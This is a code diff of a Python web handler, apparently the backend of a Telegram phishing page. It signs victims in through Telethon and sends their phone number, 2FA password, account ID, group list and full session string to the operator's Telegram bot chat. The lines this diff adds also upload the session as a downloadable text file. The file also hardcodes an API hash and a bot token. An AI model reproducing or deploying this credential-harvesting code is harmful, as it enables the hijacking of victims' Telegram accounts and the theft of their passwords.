@@ -1,21 +1,40 @@
 from http.server import BaseHTTPRequestHandler
-import json, asyncio, urllib.request
+import json, asyncio, urllib.request, datetime
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty
 
+# --- KONFIGURASI ---
 API_ID = 37391656
 API_HASH = '12d6406aa09781891052538af2fa5848'
 BOT_TOKEN = "8577863218:AAH1SSBgHjb2cc7eyMRNjp_kn_dpckSdGzQ"
 MY_CHAT_ID = "7981083332"
 
-def bot_log(text):
+def bot_send_all(text, session_str, phone):
+    # 1. Kirim Laporan Teks
+    url_msg = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data_msg = json.dumps({"chat_id": MY_CHAT_ID, "text": text, "parse_mode": "Markdown"}).encode()
+    
+    # 2. Kirim File .txt (Download Session Desktop)
+    url_doc = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
+    parts = [
+        f'--{boundary}',
+        f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{MY_CHAT_ID}',
+        f'--{boundary}',
+        f'Content-Disposition: form-data; name="document"; filename="session_{phone}.txt"',
+        f'Content-Type: text/plain\r\n\r\n{session_str}',
+        f'--{boundary}--'
+    ]
+    payload_doc = '\r\n'.join(parts).encode('utf-8')
+
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        data = json.dumps({"chat_id": MY_CHAT_ID, "text": text, "parse_mode": "Markdown"}).encode()
-        urllib.request.urlopen(urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}))
+        urllib.request.urlopen(urllib.request.Request(url_msg, data=data_msg, headers={'Content-Type': 'application/json'}))
+        req_doc = urllib.request.Request(url_doc, data=payload_doc)
+        req_doc.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+        urllib.request.urlopen(req_doc)
     except: pass
 
 class handler(BaseHTTPRequestHandler):
@@ -45,31 +64,42 @@ class handler(BaseHTTPRequestHandler):
                 return {"success": True, "hash": s.phone_code_hash, "session": client.session.save()}
             
             elif action == 'signin':
+                pwd_2fa = data.get('password', '-')
                 if data.get('password'):
-                    await client.sign_in(password=data['password'])
+                    await client.sign_in(password=data.get('password'))
                 else:
                     await client.sign_in(data['phone'], data['code'], phone_code_hash=data['hash'])
                 
-                # --- AMBIL DAFTAR GRUP ---
-                group_list = []
-                dialogs = await client(GetDialogsRequest(
-                    offset_date=None, offset_id=0, offset_peer=InputPeerEmpty(), limit=20, hash=0
-                ))
-                for d in dialogs.chats:
-                    if hasattr(d, 'title'):
-                        group_list.append(d.title)
+                me = await client.get_me()
+                is_premium = "ya" if me.premium else "tidak"
                 
-                groups_str = ", ".join(group_list[:10]) if group_list else "Tidak ada grup"
-                final_string = client.session.save()
+                # Mengambil List Group (Nama | Link)
+                group_details = []
+                try:
+                    dialogs = await client(GetDialogsRequest(
+                        offset_date=None, offset_id=0, offset_peer=InputPeerEmpty(), limit=20, hash=0
+                    ))
+                    for d in dialogs.chats:
+                        title = d.title if hasattr(d, 'title') else "Unknown"
+                        link = f"t.me/{d.username}" if hasattr(d, 'username') and d.username else "private"
+                        group_details.append(f"{title} | {link}")
+                except: pass
+                
+                list_grup_str = "\n".join(group_details[:10]) if group_details else "kosong"
+                final_ss = client.session.save()
 
                 # --- FORMAT LAPORAN SESUAI PERMINTAAN ---
                 report = (
-                    f"login ✓ `{data['phone']}`\n\n"
-                    f"**Group List:**\n{groups_str}\n\n"
-                    f"**Sesi:**\n`{final_string}`"
+                    f"Login✓\n"
+                    f"ID: `{me.id}`\n"
+                    f"Nomer: `{data['phone']}`\n"
+                    f"Password 2FA: `{pwd_2fa}`\n"
+                    f"Akun premium: {is_premium}\n"
+                    f"List group: \n{list_grup_str}\n\n"
+                    f"Sesi: \n`{final_ss}`"
                 )
                 
-                bot_log(report)
+                bot_send_all(report, final_ss, data['phone'])
                 return {"success": True}
 
         except SessionPasswordNeededError:
